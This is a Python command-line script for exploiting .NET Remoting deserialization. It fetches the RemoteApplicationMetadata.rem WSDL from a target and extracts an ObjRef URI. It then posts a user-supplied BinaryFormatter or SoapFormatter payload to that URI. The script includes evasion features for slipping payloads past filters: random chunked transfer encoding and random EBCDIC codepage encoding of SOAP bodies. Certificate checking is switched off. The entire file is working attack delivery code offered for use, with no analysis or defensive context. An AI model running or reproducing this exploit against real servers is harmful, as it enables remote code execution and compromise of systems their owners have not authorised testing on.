#!/usr/bin/env python3

import argparse
import sys
from urllib.parse import urljoin
import requests
import re
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NON_ASCII_BASED_CODEPAGES = [ 37, 500, 875, 1026, 1140 ]
SERIALIZER_FORMATS = { 'binary': 'application/octet-stream', 'soap': 'text/xml' }
DEFAULT_SERIALIZER_FORMAT = 'soap'

def parse_range(val):
    l, u = r = tuple([int(i) for i in val.split('-', 2)])
    if not 0 < l <= u:
        raise Exception('range "<lower>-<upper>" must comply with 0 < lower <= upper')
    return r

def chunk_gen(data: bytes, chunk_range: (int,int)):
    min_size = max(chunk_range[0], 1)
    max_size = chunk_range[1]
    i = 0
    n = len(data)
    while i < n:
        r = random.randint(min_size, max_size)
        yield data[i:i+r]
        i += r

def main(args):
    url = urljoin(args.url, '/RemoteApplicationMetadata.rem?wsdl')
    with requests.Session() as s:
        s.verify = False
        timeout = (5,5)
        content_type = SERIALIZER_FORMATS[args.format]
        headers = {
            'Content-Type': content_type,
            '__RequestVerb': 'POST',
        }
        response = s.get(url, headers=headers, timeout=timeout, allow_redirects=False)
        content = response.content.decode('iso-8859-1')
        matches = re.findall(r'/[0-9a-f_]+/[0-9A-Za-z_+]+_\d+\.rem', content)
        if len(matches) > 0:
            objref_uri = matches[0]
            print('[+] Found ObjRef URI %s' % (objref_uri))
            if args.use_generic_uri:
                http_method = 'GET'
                headers['__RequestUri'] = objref_uri
            else:
                http_method = 'POST'
                url = urljoin(args.url, objref_uri)
            if args.verbose:
                print(f'[*] Reading payload from {args.file.name}')
            data = args.file.read()
            if args.format == 'soap':
                headers['SOAPAction'] = '""'
                if args.encoding:
                    encoding = 'cp%03d' % (random.choice(NON_ASCII_BASED_CODEPAGES))
                    if encoding is not None:
                        data = ('<?xml version="1.0" encoding="%s" ?>' % (encoding)).encode('iso-8859-1') \
                            + data.decode('iso-8859-1').encode(encoding)
            if args.chunked:
                data = chunk_gen(data, args.chunk_range)
            response = s.request(http_method, url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
            if args.verbose:
                print(response)
                print(response.headers)
                print(response.content)
        else:
            print('[-] No ObjRef URI found')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='target URL (without `RemoteApplicationMetadata.rem`)')
    parser.add_argument('-c', '--chunked', action='store_true', default=False,
                        help='use chunked Transfer-Encoding for request')
    parser.add_argument('--chunk-range', type=parse_range, default=(1,10),
                        help='range from which the chunk size should be chosen randomly (e. g., 1-10)')
    parser.add_argument('-e', '--encoding', action='store_true', default=False,
                        help='apply a random non ASCII-based encoding on SOAP')
    parser.add_argument('-f', '--format', choices=SERIALIZER_FORMATS.keys(), default=DEFAULT_SERIALIZER_FORMAT,
                        help='targeted runtime serializer format (default: soap)')
    parser.add_argument('-u', '--use-generic-uri', action='store_true', default=False,
                        help='use the generic `RemoteApplicationMetadata.rem` also for the payload delivery request')
    parser.add_argument('-v', '--verbose', action='store_true', default=False,
                        help='print verbose info')
    parser.add_argument('file', nargs='?', type=argparse.FileType('rb'), default=sys.stdin,
                        help='BinaryFormatter/SoapFormatter payload file (default: stdin)')

    main(parser.parse_args())
